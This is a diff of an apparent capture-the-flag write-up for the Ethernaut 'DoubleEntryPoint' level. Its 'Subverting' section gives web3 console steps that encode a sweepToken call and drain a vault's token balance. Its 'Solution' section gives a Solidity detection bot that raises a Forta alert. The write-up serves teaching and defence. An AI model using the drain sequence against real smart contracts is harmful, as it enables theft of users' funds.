@@ -214,11 +214,143 @@ The `DoubleEntryPoint` contract is an ERC20 token contract that delegates transf
 
 The provided smart contracts form a comprehensive system for detecting and handling potentially suspicious transactions. They showcase various aspects of token management, delegation, notification, and alerting within the Ethereum blockchain ecosystem. The contracts demonstrate the interaction between different components, enabling users to delegate transfers and receive notifications about transaction activity.
 
+## Vulnerability
 
-# Subverting
+```js
+vault = await contract.cryptoVault()
+'0x1A82fBF3aF7542B550D2850b708E6F4D423E44fa'
+```
+
+```js
+legacy = await contract.delegatedFrom()
+'0x009e22b7A97A80f8Fa89CE23854D4EF134F510E6'
+```
+
+```js
+await web3.eth.getStorageAt(vault, 1)
+'0x000000000000000000000000ce7840ab1c857db85387f39bf8e4393cbc985db0'
+```
+
+```js
+await web3.eth.call({from:player, to:legacy, data:'0xc89e4361'})
+'0x000000000000000000000000ce7840ab1c857db85387f39bf8e4393cbc985db0'
+```
+
+## Subverting
+
+```js
+await contract.balanceOf(cryptoVaultAddr).then(b => b.toString());
+'100000000000000000000'
+```
+
+```js
+const _function = {
+  "inputs": [
+    { 
+      "name": "token",
+      "type": "address"
+    }
+  ],
+  "name": "sweepToken", 
+  "type": "function"
+};
+```
+
+```js
+const param = [legacy];
+```
+
+```js
+const data = web3.eth.abi.encodeFunctionCall(_function, param);
+```
+
+```js
+await web3.eth.sendTransaction({from: player,to: vault,data: data});
+```
+
+```js
+await contract.balanceOf(vault).then(x => x.toString());
+'0'
+```
+
+# Solution
 
 ```solidity
+pragma solidity ^0.8.0;
 
+import './DoubleEntryPoint.sol';
+
+contract Bot is IDetectionBot{
+
+    address vault;
+
+    constructor(address _vault){
+        vault = _vault;
+    }
+
+    function handleTransaction(address _user, bytes calldata data) external override{
+
+         address sender;
+
+         assembly {
+            sender := calldataload(0xa8)
+            
+        }
+
+        if(sender==vault){
+            Forta(msg.sender).raiseAlert(_user);
+        }
+    }
+
+}
+```
+
+
+
+
+
+Deploy the `Bot` contract. See the transaction [on etherscan](https://sepolia.etherscan.io/tx/0x4dfe2f8b82b885e3318958c3be9c0ac3bb86912038a11e9673da23f8158e6209).
+
+```js
+forta = await contract.forta()
+'0x5b3ddf8095BD68ebf069bD900B210BB8038EC8dD'
+```
+
+```js
+const _function = {
+  "inputs": [
+    { 
+      "name": "detectionBotAddr",
+      "type": "address"
+    }
+  ],
+  "name": "setDetectionBot", 
+  "type": "function"
+};
+```
+
+
+```js
+// Bot contract's address
+
+bot = "0x53449d3dfa4542b3B1a9B204b9121c6cdb2d592b"
+'0x53449d3dfa4542b3B1a9B204b9121c6cdb2d592b'
+```
+
+
+```js
+const param = [bot]
+```
+
+
+```js
+const data = web3.eth.abi.encodeFunctionCall(_function,param)
+```
+
+See the transaction [on etherscan](https://sepolia.etherscan.io/tx/0x79aaf0c160c96c2665173c1c0f58561644ad2817b36165d6a4a32a635a13fcf5).
+
+```js
+await web3.eth.sendTransaction({from: player, to:forta, data:data})
 ```
 
 Ethernaut's message:
